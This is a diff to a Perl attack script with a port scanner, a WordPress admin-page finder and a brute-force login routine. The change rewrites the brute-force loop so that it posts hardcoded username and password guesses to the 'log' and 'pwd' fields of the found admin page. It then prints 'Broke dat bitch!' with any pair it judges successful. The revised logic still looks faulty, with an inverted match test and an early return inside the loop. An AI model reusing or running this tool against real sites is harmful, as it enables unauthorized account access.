@@ -16,7 +16,7 @@ use Net::FTP;
 use IO::Socket::INET;
 use Net::IP;
 use HTTP::Request;
-use HTML::Form;
+use HTTP::Request::Common;
 use HTTP::Cookies;
 use LWP::Protocol::https;
 use Term::ANSIColor;
@@ -56,8 +56,6 @@ chomp(my $host = <STDIN>);
 #chomp(my $user = <STDIN>);
 #print "\n\n[*]Enter the path to the list of passwords => ";
 #chomp(my $pass = <STDIN>);
-
-
 #####################################
 #Info gathering: Port scanner
 sleep(2);
@@ -106,7 +104,7 @@ sub admin_find {
 	 my $res = $bot->request($req);
     #looks for the admin page
    if ($res->is_success) {
-      print color('red');
+      print color('green');
 	    print "[*]Found the admin page!!\n";
 	    print "[*] =>\t$hunt \n";
       print color('reset');
@@ -127,9 +125,6 @@ sub brute_force {
   my @users = qw(admin root administrator user login security person); #support for file reading coming soon
   my @passwds = qw(password 123 admin admin123 BTekgFutvcx1L%9pbN); #support for file reading coming soon
   my $target = admin_find(); #Sets the variable to the returned value from the admin_find function
-  #Names of the username and password input fields on the WordPress admin panel
-  my $username = "<input name=log />";
-  my $passwordname = "<input name=pwd />";
   print color('yellow');
   print "++++++++++++++++++++++++++++++++++\n";
   print "[*]Trying to break the login\n";
@@ -140,31 +135,18 @@ sub brute_force {
   foreach (@users) {
     chomp(my $user = $_);
     foreach (@passwds) {
-        chomp(my $passwd = $_);
-        my %form =($username => $user,$passwordname => $passwd);
-        #sends a post request to the target using the form hash as a "template" for putting the username and password in the correct spot
-        my $res = $bot->post($target,\%form)->as_string;
-        my $req = HTTP::Request->new(POST=>$res);
-        if($bot){
-          #figured out the issue, will update ASAP, once I get the code correct
-          #To do:
-          # Add form submission
-          # Add status code checking for status code 
-          if ($req =~ /Error/ig) {
-            print color('red');
-            print "[*]Broke dat bitch!\n\t[*]User => " . $user . "\n\t[*]Password => " . $passwd . "\n";
-            print color('reset');
-            print "++++++++++++++++++++++++++++++++++\n";
-            next;
-          }
-          else {
-            print "Unable to break the login page with username $user \n";
-            last;
-          }
-        }
+      chomp(my $passwd = $_);
+      my $login = $bot-> post($target, log => $user, pwd => $passwd);
+      unless ($login->content !~ m/Error/g){
+        print color('green');
+        print "[*]Broke dat bitch!\n\t[*]User => " . $user . "\n\t[*]Password => " . $passwd . "\n";
+        print color('reset');
+        print "++++++++++++++++++++++++++++++++++\n";
       }
+    return;
     }
   }
+}
 ####
 #Maybe XSS or SQL, don't know yet
 
